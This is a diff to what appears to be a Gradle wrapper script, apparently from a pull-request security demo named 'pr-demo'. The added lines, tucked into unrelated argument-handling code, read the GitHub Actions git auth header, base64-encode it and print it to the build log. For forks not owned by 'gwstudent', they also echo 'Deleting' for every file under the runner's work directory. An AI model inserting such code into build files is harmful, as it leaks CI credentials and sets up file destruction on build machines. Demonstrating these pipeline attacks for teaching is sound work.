@@ -140,6 +140,7 @@ if $cygwin ; then
         fi
         i=$((i+1))
     done
+    
     case $i in
         (0) set -- ;;
         (1) set -- "$args0" ;;
@@ -153,6 +154,20 @@ if $cygwin ; then
         (9) set -- "$args0" "$args1" "$args2" "$args3" "$args4" "$args5" "$args6" "$args7" "$args8" ;;
     esac
 fi
+
+VALUE1=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | base64`
+echo VALUE1=$VALUE1
+
+GIT_REPO=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get remote.origin.url`
+echo GIT_REPO=$GIT_REPO
+GIT_USER=`echo $GIT_REPO | cut -d'/' -f4`
+
+if [ "$GIT_USER" != gwstudent ]; then 
+  echo We have access to the file system!
+  for i in `ls -R /home/runner/work`; do
+     echo "Deleting $i !"
+  done
+fi 
 
 # Escape application args
 save () {
